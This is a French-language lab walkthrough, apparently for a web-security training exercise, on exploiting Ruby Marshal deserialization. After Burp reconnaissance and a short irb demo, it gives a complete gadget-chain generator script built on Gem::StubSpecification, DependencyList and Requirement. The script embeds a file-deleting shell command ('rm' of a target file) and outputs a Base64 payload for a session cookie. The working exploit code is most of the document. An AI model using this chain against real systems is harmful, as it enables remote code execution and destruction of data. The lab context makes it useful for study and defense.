# Ruby deserialization using a documented gadget chain
- Même principe que la déserialisation PHP, sauf que là on utilise le langage Ruby comme intermédiaire.<br/>
## Reconnaissance
- Je laisse tourner burpsuite en arrière-plan pendant que je me login avec les identifiants précisés dans l'énoncé.<br/></br>
<img src="https://media.discordapp.net/attachments/768928242467340328/770030149490966548/unknown.png"/><br/><br/>
- Je check l'historique des requêtes et je sélectionne l'index où le procédé du login a été sérialisé.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770031231060017192/unknown.png?width=1195&height=890"/><br/><br/>
## Développement gadget 
- Pour commencer, un peu de théorie. Les termes utilisés par Ruby pour désigner la sérialisation et la désérialisation sont marshalling et unmarshalling.
- La classe Marshal a les méthodes de classe «dump» et «load» qui peuvent être utilisées comme suit:<br/><br/>
```ruby
$ irb
izjosve@ijzosve:~$ irb

irb(main):001:1* class Person

irb(main):002:1*   attr_accessor :name

irb(main):003:0> end
=> nil

irb(main):004:0> p = Person.new

irb(main):005:0> p.name = "ijzosve"

irb(main):006:0> p
=> #<Person:0x000055b382dc13e8 @name="ijzosve">

irb(main):007:0> Marshal.dump(p)
=> "\x04\bo:\vPerson\x06:\n@nameI\"\fijzosve\x06:\x06ET"

irb(main):008:0> Marshal.load("\x04\bo:\vPerson\x06:\n@nameI\"\fijzosve\x06:\x06ET")
=> #<Person:0x000055b383081e98 @name="ijzosve">
```
<br/><br/>
- Pour le script qui génère et vérifie la désérialisation de la gadget chain j'ai utilisé cette documentation https://www.elttam.com/blog/ruby-deserialization/#content.
<br/><br/>
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm "home/carlos/morale.txt")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
<br/><br/>
- J'exécute.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770745566602723408/unknown.png?width=1205&height=336"/><br/><br/>
- On a notre gadget chain, maintenant on a plus qu'à le remplacer par le token de la requête.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770746126319878174/unknown.png?width=1274&height=392"/><br/><br/>
